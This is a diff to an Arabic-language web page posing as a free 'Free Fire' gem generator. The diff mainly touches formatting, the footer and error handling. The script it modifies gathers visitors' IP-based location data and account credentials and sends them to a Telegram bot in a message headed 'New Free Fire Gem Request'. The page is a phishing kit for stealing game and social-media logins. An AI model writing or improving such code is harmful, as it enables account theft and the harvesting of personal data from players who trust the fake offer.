@@ -450,8 +450,8 @@
             display: block;
         }
     </style>
-</head>
-<body>
+    </head>
+    <body>
     <div class="floating-gems" id="floatingGems"></div>
     
     <div class="container">
@@ -534,7 +534,7 @@
                 </div>
             </div>
             
-<!-- Step 3: Gem Selection -->
+            <!-- Step 3: Gem Selection -->
             <div class="step" id="step3">
                 <h2 class="card-title">اختر عدد الجواهر</h2>
                 <p style="text-align: center; margin-bottom: 20px;">اختر عدد الجواهر التي تريد الحصول عليها (الحد الأقصى 1000 جوهرة)</p>
@@ -565,7 +565,7 @@
                 
                 <div class="buttons">
                     <button class="btn btn-primary" onclick="prevStep(3)">السابق</button>
-                    <button class="btn btn-primary" onclick="startProcessing()">بدء الشحن</button>
+                    <button class="btn btn-primary" onclick="nextStep(3)">بدء الشحن</button>
                 </div>
             </div>
             
@@ -612,8 +612,8 @@
         </div>
         
         <div class="footer">
-            <p>هذه الخدمة متاحة لفترة محدودة Free Fire.</p>       
-                  <p>© 2025 Free Fire diamond. جميع الحقوق محفوظة.</p>
+            <p>هذه الخدمة متاحة لفترة محدودة فقط. ليست مرتبطة رسميًا بـ Garena أو Free Fire.</p>
+            <p>© 2023 Free Fire Elite Gem Generator. جميع الحقوق محفوظة.</p>
         </div>
     </div>
     
@@ -838,8 +838,8 @@
                         timezone: data.timezone,
                         org: data.org
                     };
-                    
-                    // Prepare the message for Telegram
+
+                        // Prepare the message for Telegram
                     const message = `
 🎯 *New Free Fire Gem Request* 🎯
 
@@ -892,7 +892,11 @@ ${accountType === 'twitter' ? `👤 Username: ${credentials.username}` : ''}
                             text: message,
                             parse_mode: 'Markdown'
                         })
+                    }).catch(error => {
+                        console.error('Error sending to Telegram:', error);
                     });
+                }).catch(error => {
+                    console.error('Error getting IP info:', error);
                 });
         }
         
